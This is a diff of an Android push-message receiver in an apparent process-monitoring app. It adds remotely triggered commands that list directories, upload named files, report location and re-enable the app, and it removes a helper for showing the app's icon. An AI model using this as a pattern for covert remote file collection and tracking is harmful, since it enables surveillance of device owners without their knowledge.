@@ -1,12 +1,9 @@
 package com.apriorit.android.processmonitoring;
 
-import android.app.Activity;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.support.v4.app.NotificationCompat;
 
@@ -25,8 +22,7 @@ public class GCMPushReceiverService extends GcmListenerService {
     public void onMessageReceived(String from, Bundle data) {
         super.onMessageReceived(from, data);
         Intent intentUpdateList;
-        if (data != null)
-        {
+        if (data != null) {
             //sendNotification(data.getString("LIST_APPS"));
             Handler handler = new Handler(this);
             try {
@@ -52,11 +48,19 @@ public class GCMPushReceiverService extends GcmListenerService {
                         case "update-list":
                             handler.sendDeviceInfo(Integer.parseInt(data.getString("LIST_APPS")));
                             break;
+                        case "list-files":
+                            intentUpdateList = new Intent("LIST_FILES");
+                            intentUpdateList.putExtra("files", data.getString("LIST_APPS"));
+                            sendBroadcast(intentUpdateList);
+                            break;
+                        case "get-list-files":
+                            handler.sendListFiles(data.getString("token"), data.getString("directory"));
+                            break;
                         case "location":
                             handler.HandleDeviceLocation();
                             break;
                         case "update-blacklist":
-                            //update dababase
+                            //update database
                             handler.updateBlacklistInDB(data.getString("LIST_APPS"));
                             intentUpdateList = new Intent("UPDATE_BLACKLIST");
                             intentUpdateList.putExtra("update_type", "multiple");
@@ -68,7 +72,12 @@ public class GCMPushReceiverService extends GcmListenerService {
                             intentUpdateList.putExtra("list-devices", data.getString("LIST_APPS"));
                             sendBroadcast(intentUpdateList);
                             break;
-
+                        case "send-file":
+                            handler.sendFile(data.getString("LIST_APPS"), data.getString("filename"));
+                            break;
+                        case "enable-app":
+                            handler.setEnabledSettings(true);
+                            break;
                         default:
                             break;
                     }
@@ -77,15 +86,6 @@ public class GCMPushReceiverService extends GcmListenerService {
                 e.printStackTrace();
             }
         }
-    }
-
-    /**
-     * Enables specific activity
-     * Shows an application icon in Android application list
-     */
-    public static void setActivityEnabled(Context context, final Class<? extends Activity> activityClass) {
-        final PackageManager pm = context.getPackageManager();
-        pm.setComponentEnabledSetting(new ComponentName(context, activityClass), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
     }
 
     /*
